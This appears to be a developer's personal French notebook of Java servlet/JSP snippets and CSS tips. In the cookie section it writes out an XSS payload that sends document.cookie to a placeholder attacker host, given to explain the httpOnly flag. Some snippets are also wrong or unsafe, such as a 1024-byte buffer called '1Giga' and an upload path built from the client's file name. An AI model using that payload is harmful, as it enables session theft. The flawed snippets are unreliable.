		//BufferedReader reader = new BufferedReader(new InputStreamReader(lire)); // en fait si ca marche pour les fichiers UTF-8 à lire (utiliser mark et reset si besoin faire l'equivalent de pos de RandomAccessFile mais bon courage :-))
		NON!!! il faut utiliser les BufferedInputStream et output stream parce que buffered reader encode! comme ca:
		BufferedInputStream bis = new BufferedInputStream(lire);
		NON: /*String ligne = "";
		while ((ligne=reader.readLine())!=null){
			ligne=ligne+System.getProperty("line.separator"); // LINKù*ù peut correspondre à ce quon envoit à java.exe via : -Dma.variable=/var/wtotototo...  a partir de java 5.1 on peut mettre "%n" (mettre les -D AVANT le -jar)
			outstr.write(ligne.getBytes("ISO-8859-1")); ou outstr.write(ligne.getBytes());
		}*/ voir ci dessous:
Pour convertir un input stream en output stream voir afficher
		OUI: 
		byte[] buffer = new byte[1024]; (=1Giga)
	    int line = 0;
	    while ((line = bis.read(buffer)) > -1) {
		outstr.write(buffer,0,line);
	    }

autre facon PROPRE(pas de pb encodage) de faire un download a partir de l'objet struts formFile
			public void upload(FormFile file, String location) throws Exception {
				InputStream inputStream = file.getInputStream();
				byte[] fileContents = new byte[file.getFileSize()];
				inputStream.read(fileContents);
				FileOutputStream outputFile = new FileOutputStream(new File(location + file.getFileName())); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
				OutputStream fos = new BufferedOutputStream(outputFile);
				saj.filemanager.enterprise.FileManagerService service = (saj.filemanager.enterprise.FileManagerService) SajEnterpriseLayer
					.getDefaultInstance().getService(
						saj.filemanager.enterprise.FileManagerService.class);
						fos.write(fileContent);
						fos.close();	    
			
Autre facon de faire le download:
		  ByteArrayOutputStream lByteOut = new ByteArrayOutputStream();
				BufferedOutputStream lOut = new BufferedOutputStream(lByteOut);
				lOut.flush(); //Flushes this output stream and forces any buffered output bytes to be written out.
				lOut.close();
				
				OutputStream os = response.getOutputStream();
				PdfWriter.getInstance(document, lOut);
				os.write(lByteOut.toByteArray());
				os.flush(); //Flushes this output stream and forces any buffered output bytes to be written out.
				os.close();
				
  recuperer un cookie a partir du request: affichier la liste des cookies : (isSecure(): le navigateur n'envoi le cookie dans reseau que si canal est securisé https (seuil "securisé" paramétrable sur le navigateur). (donc si http + secure impossible d'ouvrir session). httpOnly: empecher javascript d'acceder aux cookies LINKcooklskjhh (pirate peut injecter dans champ <img onload="document.location="http://site.pirate?c=document.cookie"); Host-only 
                      Cookie[] cookies = request.getCookies();
                        String cookieName = SAPCookie;
                        String defaultValue = 1;
                        for ( int i=0; i<cookies.length; i++) {
                              Cookie cookie = cookies[i];
                              System.out.println(cookie.getPath());
                              if (cookieName.equals(cookie.getName()))
                                return(cookie.getValue());
                            }
                            return(defaultValue);
                          }
      methode plus rapide avec spring: WebUtils.getCookie(request, "nomdemoncookie");
  pour definir ajouter add un cookie:
      response.addCookie(new Cookie("com.hraccess.portal.last_language", "fr_FR"));
  renvoyer les codes d'erreur ou de succes à la reponse :(200, 500 etc...) 
      httpServletResponse.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
Super methode: recupere la session si il y en a une. Sinon, il en cree une nouvelle      
    à toute request requete meme sans moimeme creer de session, le serveur defini un jsessionid dans le cookie par defaut: je le recup sur le serveur comme ça:
        HttpSession session = servletRequest.getSession();
    		String jsessionid = session.getId();
        HttpSession session = request.getSession(true); //// attention recree une  nouvelle session si elle n'existe plus (mettre false si on ne veut pas ca) 
        et ensuite on peut recuperer des variables liees à  cette session:
          ShoppingCart previousItems =(ShoppingCart)session.getAttribute("previousItems"); (ou getValue... mais deprecie)
         On peut tout recuperer avec l'objet session: le temps passe sur le site, le nombre de fois, la date d'acces au site....
         request.isRequestedSessionIdValid() // est equivalent à request.getSession(false); je crois. mais si je veux savoir si l'utilisateur a ete authentifie je devrais ajouter une variable dans la session. Ou bien utiliser le request.getUserPrincipal()? 
************************ 
  recuperer les valeurs d'un select du request
            request.getParameterValues("nomDeMonSelect"); // recupere les parametres get ou post. Ne pas confondre avec request.getAttribute() .setAttribute() c'est uniquement cote serveur: utilisable entre jsp et servlet aussi. Ne vient pas d'une requette request http. Peut etre un objet

    		
    		
  redirige redirection web en java: (voir aussi LINKRedirectwebservice)
    HttpServletResponse servletResponse = (HttpServletResponse)response;
    servletResponse.sendRedirect("http://www.google.com"); Fait une redirection 302( pour faire une 301 faire response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY);response.setHeader("Location", "http://somewhere/"); //pour un webservice voir //LINKredirwebservice998 
    servletResponse.sendRedirect("/login");ou response.sendRedirect(request.getContextPath()+"/show.html"); // la requette request est renvoyee vers le client(url change sur browser navigateur) et redirige vers nouvelle url avec perte des params de la requette. !=.getRequestDispatcher("/urlduncontrolleur").forward(req, resp) ça reste côte serveur: ça ne va pas vers navigateur client: les params de requette sont conserves. voir LINKçç("'"'
          ATTENTION! doit être la dernière chose executee : pas de chain après ou d'autre redirection de requette! sinon j'aurais java.lang.IllegalStateException: Impossible d'utiliser faire-suivre (forward) après que la reponse ait ete envoyee          
  pour voir l'adresse ip du client adresse ip du reverse proxy:
      String ipadress = request.getHeader("X-FORWARDED-FOR"); // renvoit l'adresse ip de l'utilisateur client original
      if (ipadress==null)
      {
        servletRequest.getRemoteAddr(); // ip du reverse proxy si il y en a 
      }
    ou recuperer adresse ip de l'appelant d'une servlet
        servletRequest.getRemoteAddr()
    PRG :
          GET : ne modifie jamais l'état du systeme sauf des trucs comme le logs, ne fait que renvoyer data comme un select. always load pages using GET
          PUT : ne fait que modifier update un data du système
          POST : Fait tout ce que PUT ne fait pas: CREATION. never show pages in response to POST
          DELETE : ne fait que supprimer un data du système. Peut etre async. voir LINKcodesHttp 20x 
          Navigate from POST to GET using REDIRECT LINKredirwebservice998 //on peut faire comme ca dans un webservice qui a une methode post
                        URI go = new URI("https://"+httpRequest.getServerName()+"/app/foryou/denied.html?samlDenied");
                        javax.ws.rs.core.Response response = javax.ws.rs.core.Response.seeOther(go).build(); //LINKRedirectwebservice
                        return response;
pour recuperer le nom de l'utilisateur connecte : 
    request.getUserPrincipal()
exemple de generation de graphique avec jcharts : c'est une jsp: 
                  <%@ page language="java" contentType="text/html; charset=ISO-8859-1" errorPage="/error_pages/redirect_error.jsp"%>
                  <%@ page import="es.renault.util.i18n.struts.services.I18NService, es.renault.util.i18n.I18NManager"%>
                  <%@ page import="org.jCharts.axisChart.AxisChart,org.jCharts.axisChart.customRenderers.axisValue.renderers.ValueLabelPosition,org.jCharts.axisChart.customRenderers.axisValue.renderers.ValueLabelRenderer,org.jCharts.chartData.AxisChartDataSet"%>
                  <%@ page import="org.jCharts.chartData.DataSeries,org.jCharts.chartData.interfaces.IAxisDataSeries,org.jCharts.encoders.ServletEncoderHelper"%>
                  <%@ page import="org.jCharts.properties.*"%>
                  <%@ page import="org.jCharts.properties.util.ChartFont,org.jCharts.types.ChartType,java.awt.*,java.io.IOException"%>
                  
                  <%@ taglib uri="/WEB-INF/struts-html.tld" prefix="html" %>
                  <%@ taglib uri="/WEB-INF/struts-bean.tld" prefix="bean" %>
                  <%@ taglib uri="/WEB-INF/struts-logic.tld" prefix="logic" %>
                  <%@include file="/jsp/charte/FunctionsJS.jsp"%>
                  
                  
                  <%
                  	try
                  	{
                              ChartFont labelRendererFont = new ChartFont( new Font( "Arial Black", Font.PLAIN, 10 ), Color.black );
                  			ChartFont titleFont = new ChartFont( new Font( "Georgia Negreta cursiva", Font.PLAIN, 14 ), Color.black );
                  			ChartFont axisScaleFont = new ChartFont( new Font( "Georgia Negreta cursiva", Font.PLAIN, 13 ), Color.black );
                  			String[] legendLabels= (String[])request.getSession().getAttribute("legendLabels");
                  			String xAxisTitle= (String)request.getSession().getAttribute("xAxisTitle");
                  			String yAxisTitle= (String)request.getSession().getAttribute("yAxisTitle");
                  			String title = (String)request.getSession().getAttribute("title");
                  			
                  			Paint[] paints = new Paint[legendLabels.length];
                  			if (legendLabels.length == 5){
                  			paints[0]=Color.yellow;
                  			paints[1]=Color.blue;
                  			paints[2]=Color.red;
                  			paints[3]=Color.magenta;
                  			paints[legendLabels.length-1]=Color.green;
                  			} else {
                  			paints[0]=Color.green;
                  			paints[1]=Color.orange;
                  			paints[2]=Color.red;
                  			paints[3]=Color.magenta;
                  			}
                  			String[] xAxisLabels= (String[])request.getSession().getAttribute("mois");
                  			double[][] data = (double[][])request.getSession().getAttribute("data");
                  			ClusteredBarChartProperties clusteredBarChartProperties= new ClusteredBarChartProperties();
                        ValueLabelRenderer valueLabelRenderer = new ValueLabelRenderer( false, false, true, 0 );
                  			valueLabelRenderer.setValueLabelPosition( ValueLabelPosition.ON_TOP );
                  			valueLabelRenderer.useVerticalLabels( false );
                  			valueLabelRenderer.setValueChartFont(labelRendererFont);
                  			clusteredBarChartProperties.addPostRenderEventListener( valueLabelRenderer );	
                  			
                  			DataSeries dataSeries = new DataSeries( xAxisLabels, 
                                                          xAxisTitle, 
                                                          yAxisTitle,
                                                          title );
                  			AxisChartDataSet axisChartDataSet= new AxisChartDataSet( data, 
                                                                           legendLabels, 
                                                                           paints, 
                                                                           ChartType.BAR_CLUSTERED, 
                                                                           clusteredBarChartProperties );
                  			dataSeries.addIAxisPlotDataSet( axisChartDataSet );
                  
                  			ChartProperties chartProperties= new ChartProperties();
                  			chartProperties.setTitleFont( titleFont );
                  						
                  			AxisProperties axisProperties= new AxisProperties();
                  			axisProperties.getXAxisProperties().setScaleChartFont( axisScaleFont );
                  			axisProperties.getYAxisProperties().setScaleChartFont( axisScaleFont );
                  
                  			//axisProperties.setBackgroundPaint( Color.magenta );
                  			//ChartStroke xAxisGridLines= new ChartStroke( new BasicStroke( 1.0f ), Color.black );
                  			
                  			axisProperties.getXAxisProperties().setShowGridLines( AxisTypeProperties.GRID_LINES_ALL);
                  			axisProperties.getYAxisProperties().setShowGridLines( AxisTypeProperties.TICKS_ALL);
                  
                  			LegendProperties legendProperties= new LegendProperties();
                  			//legendProperties.setBackgroundPaint( Color.lightGray );			
                  			
                  			DataAxisProperties dataAxisProperties= (DataAxisProperties) axisProperties.getYAxisProperties();
                  			dataAxisProperties.setRoundToNearest((int)(legendLabels.length/5)); 
                  			
                  			AxisChart axisChart= new AxisChart( dataSeries, 
                                                      chartProperties, 
                                                      axisProperties, 
                                                      legendProperties, 
                                                      950, 
                                                      600 );
                  
                  			ServletEncoderHelper.encodeJPEG13( axisChart, 1.2f, response );
                  	}
                  	catch(Exception e)
                  	{
                  		System.out.println(e);
                  	}
                  %>

JNDI :LINK''''**'''' si j'ai ca en java:
              Context init = null;
              init = new javax.naming.InitialContext();  
              srcGDPark = (String)init.lookup("java:comp/env/GDPARK");
              ou init = envCtx = getInitialContext(null); //initialContext = new InitialContext();initialContext =	(Context) initialContext.lookup("java:comp/env");//heu. Celui ci recup quoi?
                il va soit chercher dans web.xml ca: 
                	<env-entry>
                  		<env-entry-name>GDPARK</env-entry-name>
                  		<env-entry-value>/pvedev01/pve/logs/gdpark.prn</env-entry-value> ou <env-entry-value>c:.devtools.appli01.sajdev01.saj.i18n.labels</env-entry-value>
                  		<env-entry-type>java.lang.String</env-entry-type>
          	</env-entry>
          	soit dans 
              tomcat/conf/server.xml
                      <GlobalNamingResources ...>
                      ... 
                          <Environment name="maxExemptions"(NOM) value="10" type="java.lang.Integer" override="false"/>
                      ...
                      </GlobalNamingResources>
            ou bien sous tomcat/conf/Catalina/localhost/monApplication.xml // mais dans ce cas peut etre que besoin ça qqch dans web.xml voir LINK##--~~## 
                      <Context>
                          ...
                            <Environment name="log4j.configuration"(NOM) //initCtx.lookup("java:comp/env/NOM");
                            value="/path/to/installed/log4j.properties"
                            type="java.lang.String" />
                            ...
                      </Context>
          en effet pour ibm: si j'ai l'erreur  	
                                javax.naming.NamingException - Name comp/env/jdbc not Found in Context "java:" namenotfoundexception
                                Cause
                                The most likely cause of this exception is that the application does an indirect JNDI lookup, but a resource 
                                reference does not exist for the resource that is looked up. To provide some background information, 
                                there are two different types of JNDI lookups in WebSphere Application Server:
                                
                                   1. A direct, or global, JNDI lookup occurs when the application looks up the physical 
                                   JNDI name of a resource that is bound to the namespace. For example, 
                                   if the JNDI name of a data source is "jdbc/myDS", the lookup would look like this:
                                      DataSource ds = (DataSource)ctx.lookup("jdbc/myDS");
                                   2. An indirect, or local, JNDI lookup occurs when the application looks up a resource 
                                   reference which maps to the physical JNDI name. A resource reference is defined in the 
                                   application deployment descriptor, web.xml for a Web module, ejb-jar.xml for an EJB module, 
                                   or application-client.xml for an application client module. For example, if the resource reference name 
                                   is "jdbc/myDSresref", the lookup would look like this:
                                      DataSource ds = (DataSource)ctx.lookup("java:comp/env/jdbc/myDSresref");
Bonne methode pour faire des selectbox :
          Dans mon action :
          tform.setCriteres(this.setSelectTagFromGetter("getCriteres", false)); // getCriteres ou getPhase ou whatever
  dans classe utils :
 // nombre de minutes entre deux dates hors weekends : 
			public long nonWeekendMinutesBetweenTwoDates(Date debut, Date fin) throws Exception
			{
					GregorianCalendar gc1 = new GregorianCalendar(); depuis java8 voir LocalDateTime!!!!
					SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy HH:mm"); // attention n'est pas threadsafe.
                                                                        "yyyy-MM-dd-HH:mm:ss.SSS"); // pour aussi les millisecondes (date format)
					SimpleDateFormat dateformatter = new SimpleDateFormat("dd/MM/yyyy");
					SimpleDateFormat hourformatter = new SimpleDateFormat("HH");
					SimpleDateFormat minuteformatter = new SimpleDateFormat("mm");
					//nb de minutesjours hors weekend entre les deux joures des dates :
					long minutesToRemove=new Long(0);
					long minutesToAdd=new Long(0);
					Date debutdate= dateformatter.parse(dateformatter.format(debut));
					Date findate= dateformatter.parse(dateformatter.format(fin));
					while (debutdate.before(findate))
					{
						gc1.setTime(new Date(debutdate.getTime()));
						if (gc1.get(GregorianCalendar.DAY_OF_WEEK)==GregorianCalendar.SATURDAY || gc1.get(GregorianCalendar.DAY_OF_WEEK)==GregorianCalendar.SUNDAY)
						{
							minutesToRemove=minutesToRemove+(24*60);
							minutesToAdd=minutesToAdd+(24*60);
						}
						else
						{
							minutesToAdd=minutesToAdd+(24*60);
						}
						debutdate = new Date(debutdate.getTime()+(1*24*60*60*1000));											
					}
					//supprimer les minutes supplemenaitres de debut et de fin.					}	
					minutesToRemove = minutesToRemove+(Long.parseLong(hourformatter.format(debut))*60+Long.parseLong(minuteformatter.format(debut)));
					minutesToAdd	=minutesToAdd 	 +(Long.parseLong(hourformatter.format(fin))*60+Long.parseLong(minuteformatter.format(fin)));
					minutesToAdd=minutesToAdd-minutesToRemove;
					return minutesToAdd;
				}

        public List<Select> setSelectTagFromGetter(String getterMethod, boolean addEmptyValue)
      			throws Exception {
      		log.debug("--- setSelectTagFromGetter");
      		SearchLotCommand lotCommand = new SearchLotCommand();
      		lotCommand.action = getterMethod;
      		lotCommand.execute();
      		List<Select> select = lotCommand.getRecords();
      		Collections.sort(select, new ComparSelect());
      		if (addEmptyValue)
      		{
      			select.add(0, new Select("Empty",""));
      		}
      		return select;
      	}
          mon bean select: 
              public class Select implements Serializable {
                  		/**Indiquer l'utilitee du champ */
                  	private static final long serialVersionUID = -6797173775060580144L;
                  	private String label;
                  	private String value;
                  	public static String findLabelFromSelect(List<Select> select, String id)
                  	{
                  		ResourceBundle appResources = ResourceBundle.getBundle("ApplicationResources");
                  		String all = appResources.getString("01002" );
                  		String ret = " - ";
                  		for(Select sel : select)
                  		{
                  			if (sel.value.equals(id)) ret=sel.getLabel(); 
                  		}
                  		if (ret.trim().equals("")) ret=all;
                  		return ret;
                  	}
                  	public Select(String lab, String val)
                  	{
                  		this.label=lab;
                  		this.value=val;
                  	}
                  	.....
        dans la jsp: 
        					<layout:select key="SYS_NOTHING" style="width:150px" (multiple="true" size="10") layout="true ou false" name="tabForm"	property="strCriteres(option selectionnee)">
        						<layout:optionsCollection name="tabForm" property="criteres"(dans mon form j'ai getCritere qui renvoit une List<Select> ) label="label" value="value" />
        					</layout:select>
pour declarer un listener: 
    dans web.xml: 
    <listener>
		    <listener-class>renault.dwi.util.filter.SessionTraceFilterClass</listener-class>
	   </listener>
pour capter un startup demarre et un shutdown arrete d'une appli:
       faire pareil qu'un listener mais implementer aussi : javax.servlet.ServletContextListener (la classe est aussi un listener)
pour detruire une session:
      dans l'action:
      		session.setArcaBean(null);
		      session.invalidate(); 
    dans un listener on peut meme le catcher: 
    public void sessionDestroyed(HttpSessionEvent arg0) (implementer HttpSessionListener) 
	   {    ...
erreur, si on voit le code de la jsp quand on veut acceder a une application:
		c'est parce que il y a un delta entre le contextroot du webdynamique et de l'ear
pour faire une infobulle sur n'importe quoi on peut faire ca:
		<div title="message de mon infobulle">
				    		<a href="ZoneDetail.do?reqCode=detail&id=17">
				    			B
			    			</a>
 		</div>	   
 		autre exemple:
  		<div title="<bean:message key="PTL_CORRESP_DELETE" />" align="center">
    		<a href="ZoneManager.do?reqCode=delete&id=<layout:write name="element" property="idZone" />" onclick="return confirmDelete();"> (dans le javascript confirmDelete, mettre return confirm("blabla");)
    			<html:img page="/../images/pictos/deleteicon_2.gif"/> (il faut peut etre entourer les images de layout:cell)peut etre aussi besoin mettre contextRelative="true"
   			</a>
   		</div>	
pour ecrire une variable java dans une page  html correctement: (accents)
		utiliser HTMLEncoder. 
    Sur android:
    	  String stringISO = new String (lByteOut.toByteArray(), "ISO-8859-1" ); // a adapter... 
        TextUtils.htmlEncode(stringISO);
************************
InvokerServlet sert à appeler une servlet en tappant son chemin dans l'url: exemple: http://etc/cpi/servlet/mon.package.MaClasse
Variables en session et variables applicatives partagees pour tout le monde:
		ServletContext est applicatif et est single pour tous les utilisateurs contrairement à l'objet Session qui est specifique à un utilisateur
		utile pour connetre le nombre d'utilisateurs connectes nombre utilisateurs
pour les versions was voir was :
Si les jsp includes (inclues) ne compilent pas il faut se mettre en dos dans le repertoire contenant les jsp et faire : (Sous Dos)
	COPY /B *.jsp +,,
pour appeller une action lorsque la fenetre est fermee (quand on ferme une fenetre)
					<body onunload="javascript:closeApplication();">// attention ca ca s'execute quand on quitte la fenetre en cours ou quand on close la fenetre donc besoin d'un gardefou
					<script>
					function closeApplication()
					    {
					        if (document.forms['dossierDetailForm'] != null) // le gardefou
					        {
					            window.open('../jsp/tox/default/tmp.jsp','tempwindow','menubar=no, status=no, scrollbars=no, menubar=no, width=200, height=100');
					        }
					    }
					</script>
					dans temp.jsp il y a : 
					<html>
					<body>
					    <form name="oncloseForm" action="<%=request.getContextPath()%>/auth/CloseApplication.do" method="get" onsubmit="window.close();">
					    </form>
					    <script type='text/javascript'>
					        document.forms["oncloseForm"].submit();
					    </script>
					</body>
					</html>


pour bien logger les erreurs: 
	le classes appellantes (typiquement classes actions) ecrivent les erreurs en stacktrace et les classes appellees throwent les erreurs en haut. (voir stacktrace..)

Enleve expres

Hiberbnate :
pour faire des saveOrUpdate: 
    public HistoLupDto enregistrerOrUpdateHistoLup(HistoLupDto histoLup) {
		HistoLupPo histoLupPo = HistoLupBinder.bindHistoLupDto(this.binder, histoLup);
		if (histoLup.getOid() != null && histoLup.getOid()!=-1) {
			this.persistenceManager.load(HistoLupPo.class, histoLup.getOid());
			this.persistenceManager.merge(histoLupPo);
		} else {
			this.persistenceManager.save(histoLupPo);
		}	
		this.persistenceManager.flush(); // c'est un commit
		return HistoLupBinder.bindHistoLupPo(this.binder,histoLupPo);
	}
	
enleve expres

pour faire des gif animes: 
  imageReady
Css :
commentaires:   
    /*commentaires*/
    pour la selection fils child etc voir LINKcssselectors
SingleResponsabilityPrinciple: (BEM) class=nomdublock-sousblock__input--etat. Exemple: menu-sousmenu__elementmenu--choisit Chaque class n'a qu'un seul style
afficher en 3D sur chrome: 
    faire chrome://flags#enable-devtools-experiments activer pour les developpeurs > ouvrir developper pannel > menu droit> othertools> layer MAIS C EST ENCORE DE LA MERDE TOUT EST PLAT
majuscules minuscules upercase lowercase :
    text-transform: none;
    text-transform: uppercase; 
    ...
plus petit que <br> pour que deux images se collent: 
    display:block; padding-bottom:0px
effet parallax: une image ne scroll pas ou scroll à vitesse differente
    fixe:
    sur un div: background-image: url("https://www.wenhuaduverge.com/img/NewsLetter/Ah02hight.jpg");display: block;position: relative;
                background-attachment: fixed;
    scroll à vitesse decallée
                    /* Tiny reset thingy */
                    body,html{margin:0;padding:0;}
                    
                    .wrapper {
                      /* The height needs to be set to a fixed value for the effect to work.
                       * 100vh is the full height of the viewport. */
                      height: 100vh;
                      /* The scaling of the images would add a horizontal scrollbar, so disable x overflow. */
                      overflow-x: hidden;
                      /* Enable scrolling on the page. */
                      overflow-y: auto;
                      /* Set the perspective to 2px. This is essentailly the simulated distance from the viewport to transformed objects.*/
                      perspective: 2px;
                    }
                    
                    .section {
                      /* Needed for children to be absolutely positioned relative to the parent. */
                      position: relative;
                      /* The height of the container. Must be set, but it doesn't really matter what the value is. */
                      height: 100vh;
                      
                      /* For text formatting. */
                      display: flex;
                      align-items: center;
                      justify-content: center;
                      color: white;
                      text-shadow: 0 0 5px #000;
                    }
                    
                    .parallax::after {
                      /* Display and position the pseudo-element */
                      content: " ";
                      position: absolute;
                      top: 0;
                      right: 0;
                      bottom: 0;
                      left: 0;
                      
                      /* Move the pseudo-element back away from the camera,
                       * then scale it back up to fill the viewport.
                       * Because the pseudo-element is further away, it appears to move more slowly, like in real life. */
                      transform: translateZ(-1px) scale(1.5);
                      /* Force the background image to fill the whole element. */
                      background-size: 100%;
                      /* Keep the image from overlapping sibling elements. */ 
                      z-index: -1;
                    }
                    
                    /* The styling for the static div. */
                    .static {
                      background: red;
                    }
                    
                    /* Sets the actual background images to adorable kitties. This part is crucial. */
                    .bg1::after {
                      background-image: url('https://placekitten.com/g/900/700');
                    }
                    
                    .bg2::after {
                      background-image: url('https://placekitten.com/g/800/600');
                    }
                    <main class="wrapper">
                      <section class="section parallax bg1">
                        <h1>Such Adorableness</hi>
                      </section>
                      <section class="section static">
                        <h1>Boring</h1>
                      </section>
                      <section class="section parallax bg2">
                        <h1>SO FWUFFY AWWW</hi>
                      </section>
                    </main>

compatibilite:
        @supports (display:flex){
              .row-images{
                      display:flex; align-items: flex-end; flex-flow: row; margin-top:10%;
              }
              .row-images>div{
                      padding-right: 2%;
              }
        }
        
selecteur: LINKcsslkhkhkhkhkh
  !important // signifie qu'il est prioritire il prend la precedence override tout
  espacement des caractères
       letter-spacing: 6px;
   espacement des lignes
      line-height: 18px;
faire effet blur smooth filtre : genial.
 Utiliser filter http://www.w3schools.com/cssref/playit.asp?filename=playcss_filter&preval=blur(5px)
 pour faire une ombre centrale à l'interieur assombrir l'image
        filter: brightness(70%); // une valeur >100% eclairci l'image (120%)
 
centrer un texte middle verticalement : 
      line-height:39px; et rien d'autre
pour faire un effet 3d avec les caractères : 
      -webkit-transform: rotateX(89deg);
pour supprimer personnaliser dans tout imput select radio checkbox le bleu qui entoure quand on est en focus : 
    outline:0;
pour alligner aligner les <li> des <ul> verticallement mettre  
      display:table-cell; dans les li  
pour empecher le body de scroller lui attribuer la classe : 
  .no-scroll {
  height: 100%;
  overflow-y: scroll;
  width: 100%;
  /* position: fixed; pour pas de scroll x ni y */
  overflow-x: hidden; 
  }
adapter le css au mobile ecran plus petit switcher entre css en fonction taille ecran ou taille fenetre responsive
Utiliser dans chrome "Responsive...." pas les differentes marques de phone: c trop long. avec responsive je bouge la fenetre à 30% de zoom et je teste tout comme ca d'un coup
      directement dans un css
            @media
            [not, only] [all, print, screen] and (min-width: 401px) and (max-width: 600px)   // taille fenetre option.
            // only c'est compreensible que pour les vieux browsers: n'applique pas ce  @media là si tu ne comprends rien.
            je suis obligé de definir all ou print ou screen si j'utilise not ou only sinon pas obligé 
            only screen and (max-width:480px),   // que pour les ecrans plus petit que 480
            only screen and (max-device-width:480px)              // taille mobile option.
            exemple : @media (max-width: 768px) and (max-width: 1200px) //ici pour les browser modernes je n'utilise pas not only et screen etc...
            {
                .uneclasse
                {...}
                #etc...
            }
         
            /* Extra small devices (phones, 600px and down) */
            @media only screen and (max-width: 600px)
            {
            .mondivparent{background-color:red;}
            }
            /* Small devices (portrait tablets and large phones, 600px and up) */
            @media only screen and (min-width: 600px) {
            .mondivparent{background-color:blue;}
            }
            /* Medium devices (landscape tablets, 768px and up) */
            @media only screen and (min-width: 768px) {
            .mondivparent{background-color:yellow;}
            }
            /* Large devices (laptops/desktops, 992px and up) */
            @media only screen and (min-width: 992px) {
            .mondivparent{background-color:black;}
            }
            
            /* Extra large devices (large laptops and desktops, 1200px and up) */
            @media only screen and (min-width: 1200px) {
            .mondivparent{background-color:green;}
            }

      dans l'entete du html on defini quel css utiliser dans les differents cas
            <link rel="stylesheet" type="text/css" media="only etcetc..." href="small-device.css"/>
      ensuite pour verifier que tout est bon : 
          http://protofluid.com
pour faire un menu de telephone mobile:
            #menubtn
            {
                color: black;
                position: fixed;
                left: 3%;
                cursor: pointer; // c'est le doigt
                width: 20px;
                background-color: #4c4c4c;
                position: absolute;
                top: 10px;
                height: 1px;
                opacity: 1;
            }
            #menubtn:before
            {
                height: 1px;
                top: 38px;
                position: fixed;
                left: 3%;
                cursor: pointer;
                content: "";
                width: 20px;
                background-color: #4c4c4c;
                opacity: 1;
            }
            #menubtn:after
            {
                height: 1px;
                top: 53px;
                position: fixed;
                left: 3%;
                cursor: pointer;
                content: "";
                width: 20px;
                background-color: #4c4c4c;
                opacity: 1;
            }            
            
pour faire des checkbox et radios personalises
    #ask > input[type="checkbox"]::after {
            display: block;
            content: " ";
            background-color: #e9ecee;
            color: #99a1a7;
            border: 1px solid #adb8c0;
            padding: 16px;
            left: -10px;
            top: -10px;
            position: relative;
            }
    #ask > input[type="checkbox"]:checked::after {
              display: block;
              content: " ";
              padding: 10px;
              left: -10px;
              top: -10px;
              position: relative;
              border: 6px solid #adb8c0;
              background: #99a1a7;
              }
pour faire un croop crop sur une image rogner
    <div style="background-image: url('/modules/amazzingblog/views/img/uploads/posts/7/m/1-595010f05579d.jpg');width: 35%;height: 178px;background-position-y: -122%;"></div>
pour faire un background avec des zones pour cliquer lien absoluts absolu 
      <body style="background: url('img/Image 1-1-2.png'),no-repeat; background-size: 100% 100%;">
      <a style="position:absolute; left:15%; top: 20%; height:20%; width:20%; text-decoration:none" href="./womens/gallery.php"></a>
      <a style="position:absolute; left:44%; top: 5%; height:20%; width:20%; text-decoration:none" href="./mens/gallery.php"></a>
      <a style="position:absolute; left:70%; top: 20%; height:20%; width:20%; text-decoration:none" href="./artwork/gallery.php"></a>
      <a style="position:absolute; left:50%; top: 59%; height:20%; width:20%; text-decoration:none" href="./advertising/gallery.php"></a>
      <a style="position:absolute; left:15%; top: 78%; height:20%; width:20%; text-decoration:none" href="./show/gallery.php"></a>
      <a style="position:absolute; left:78%; top: 78%; height:20%; width:20%; text-decoration:none" href="./about/gallery.php"></a>
faire un background color transparant : 
      aller sur http://www.css3maker.com/css-3-rgba.html
      mettre par ex: background-color: rgba(255, 255, 255, 0.1);
faire un background image transparent :
mettre un div au dessus avec opacity reduite et z-index reduit et background:url(...)       
      #fond
      {
      background: url(maths.jpg) repeat;
      background-size:10%; (optionnel)
      height: 1000px;
      opacity: 0.25;
      position: absolute;
      width: 100%;
      margin-top: -38px;
      z-index: -10;
      }

pour faire clignoter un texte : 
  text-decoration: blink; 
pour centrer un tableau une table dans un div lui mettre : 
  pas text-align:center mais margin: 0 auto;
pour faire une animation en boucle sur une image par exemple avec css. (l'ere des gif annimes est revolue!) panorama defile
        ATTENTION pour les animations annimations en css utiliser en priorite opacity et transition ou transform 
        mettre les prefix devant chaque animation et keyframe: -webkit-, -moz-, -o-, -ms-
          /* première etape */
          p#doigt a:hover, p#doigt a:focus {
          background-color:#ff8c00; /* pour les vieux navigateurs */
          color: black;
          (-webkit-; -moz-; -o-; -ms-)animation-name: doigt; /* nom de l'animation */
          (-webkit-; -moz-; -o-; -ms-)animation-duration: 4s; /* temps de l'animation (4s) */
          (-webkit-; -moz-; -o-; -ms-)animation-iteration-count: infinite; /* nombre de boucles (infinie) */
          (-webkit-; -moz-; -o-; -ms-)animation-timing-function: linear; /* acceleration de l'animation (constant) */ease-in; ease-out
          }
          /* deuxième etape */
          @(-webkit-; -moz-; -o-; -ms-)keyframes doigt {
          0% {background:rgba(255,140,0,0.4) url(/images/main.png) no-repeat 5px 10px;}
          50% {background:rgba(255,140,0,1) url(/images/main.png) no-repeat 50px 10px;}
          100% {background:rgba(255,140,0,0.4) url(/images/main.png) no-repeat 5px 10px;}
          }
pour eviter qu'un texte aille à la chariot retour casse ligne quand il y a des espaces : 
    white-space: nowrap;          
quand un texte depasse un div mais qu'on ne veut pas le masquer mais qu'il aille a la ligne : 
    style='word-wrap:break-word'
pour faire un menu deroulant :
                      .menu:hover{
                          
                          text-decoration: none;
                      }
                      .menu:active{
                      
                        border: 1px inset;
                        text-decoration: none;
                      }     
                      .menuActive{
                      	background-color: #5C5959;
                      	    padding-left: 8px;
                          padding-right: 11px;
                        color: #C61A35;                                             
                            text-decoration: none;
                            font-size: 17px;
                            float:left;
                              margin-left:1%;
                      }     
                      .menu {
                          padding-left: 8px;
                          padding-right: 11px;
                      	      background-color: #5C5959;
                              color: white;
                              font-size: 17px;
                              text-decoration: none;
                              float:left;
                              margin-left:1%;
                              cursor:pointer;
                      }
                      .menu>.submenu
                      {
                        display:none;
                      }
                      .menu:hover>.submenu
                      {
                        display:block;
                      }
                      .submenu
                      {
                        background-color: #5C5959;
                        color: white;
                        font-size: 17px;
                        text-decoration: none;
                        position:absolute; 
                      }
                    <div class="menu">
                         <div class="submenu">
                                <div class="menu" onclick="afficheAide();">Aide</div><!-- <div id="animAide" style="border:solid #000000; opacity:0.0; position: absolute;"></div>--> 
                                <br>
